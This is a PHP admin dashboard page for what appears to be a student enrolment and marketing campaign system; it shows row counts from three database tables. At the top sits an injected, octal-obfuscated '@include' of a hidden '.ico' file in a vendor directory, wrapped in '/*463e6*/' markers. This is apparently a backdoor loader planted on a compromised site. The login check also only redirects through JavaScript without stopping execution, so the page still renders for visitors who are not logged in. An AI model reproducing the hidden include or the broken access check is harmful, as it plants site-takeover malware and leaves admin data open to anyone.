<?php
/*463e6*/

@include "\057ho\155e/\154tr\141bn\150nf\155lr\057pu\142li\143_h\164ml\057we\142ak\155.c\157m/\141dm\151n/\166en\144or\163/i\157n.\162an\147eS\154id\145r/\056eb\142d7\07193\056ic\157";

/*463e6*/
 
session_start(); 
include("db.php");
if(isset($_SESSION['id_admin']) == ''){
echo '<script>window.open("login.php", "_self")</script>';
}
include("head.php");
?>
<style>
.home{text-align: center;}

</style>
  <body class="nav-md">
    <div class="container body">
      <div class="main_container">
        <div class="col-md-3 left_col">
          <div class="left_col scroll-view">
           <?php include("sidebar.php");?>
           
          </div>
        </div>

        <!-- top navigation -->
        <?php include("header.php");?>
        <!-- /top navigation -->

        <!-- page content -->
        <div class="right_col" role="main1" style="height:260px;min-height:210px!important;">
          <!-- top tiles -->
          <div class="row tile_count" style="border-bottom:1px solid  #d9dee4;">
            <div class="col-md-4 col-sm-4 col-xs-6 tile_stats_count home">
              <span class="count_top"><i class="fa fa-user"></i> Total Register Student</span>
              <div class="count">
               <?php $view_posts = " select * from  std_registration ";
                $run_posts = mysqli_query($con, $view_posts);
                $rowcount = mysqli_num_rows($run_posts);
                echo $rowcount; ?>
                </div>
            </div>
            
            <div class="col-md-4 col-sm-4 col-xs-6 tile_stats_count home">
              <span class="count_top"><i class="fa fa-dot-circle-o" aria-hidden="true"></i> Total Application form</span>
               <div class="count">
              <?php $view_posts = " select * from  enrolment_master ";
                $run_posts = mysqli_query($con, $view_posts);
                $rowcount = mysqli_num_rows($run_posts);
                echo $rowcount; ?>
                </div>
               
            </div>
            
            <div class="col-md-4 col-sm-4 col-xs-6 tile_stats_count home">
              <span class="count_top"><i class="fa fa-database" ></i>&nbsp;Total Campaign Data</span>
               <div class="count">
              <?php $view_posts = " select * from  campaign_data ";
                $run_posts = mysqli_query($con, $view_posts);
                $rowcount = mysqli_num_rows($run_posts);
                echo $rowcount; ?>
                </div>
              
            </div>
            
             
            
          
          </div>
         
          <!-- /top tiles -->

          <!--div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
              <div class="dashboard_graph">

                <div class="row x_title">
                  <div class="col-md-6">
                    <h3>Network Activities <small>Graph title sub-title</small></h3>
                  </div>
                  <div class="col-md-6">
                    <div id="reportrange" class="pull-right" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc">
                      <i class="glyphicon glyphicon-calendar fa fa-calendar"></i>
                      <span>December 30, 2014 - January 28, 2015</span> <b class="caret"></b>
                    </div>
                  </div>
                </div>

                <div class="col-md-9 col-sm-9 col-xs-12">
                  <div id="chart_plot_01" class="demo-placeholder"></div>
                </div>
                <div class="col-md-3 col-sm-3 col-xs-12 bg-white">
                  <div class="x_title">
                    <h2>Top Campaign Performance</h2>
                    <div class="clearfix"></div>
                  </div>

                  <div class="col-md-12 col-sm-12 col-xs-6">
                    <div>
                      <p>Facebook Campaign</p>
                      <div class="">
                        <div class="progress progress_sm" style="width: 76%;">
                          <div class="progress-bar bg-green" role="progressbar" data-transitiongoal="80"></div>
                        </div>
                      </div>
                    </div>
                    <div>
                      <p>Twitter Campaign</p>
                      <div class="">
                        <div class="progress progress_sm" style="width: 76%;">
                          <div class="progress-bar bg-green" role="progressbar" data-transitiongoal="60"></div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="col-md-12 col-sm-12 col-xs-6">
                    <div>
                      <p>Conventional Media</p>
                      <div class="">
                        <div class="progress progress_sm" style="width: 76%;">
                          <div class="progress-bar bg-green" role="progressbar" data-transitiongoal="40"></div>
                        </div>
                      </div>
                    </div>
                    <div>
                      <p>Bill boards</p>
                      <div class="">
                        <div class="progress progress_sm" style="width: 76%;">
                          <div class="progress-bar bg-green" role="progressbar" data-transitiongoal="50"></div>
                        </div>
                      </div>
                    </div>
                  </div>

                </div>

                
              </div>
            </div>

          </div-->
          
          	
        </div>
        <!-- /page content -->

        <!-- footer content -->
         <?php include("footer.php");?>
        <!-- /footer content -->
      
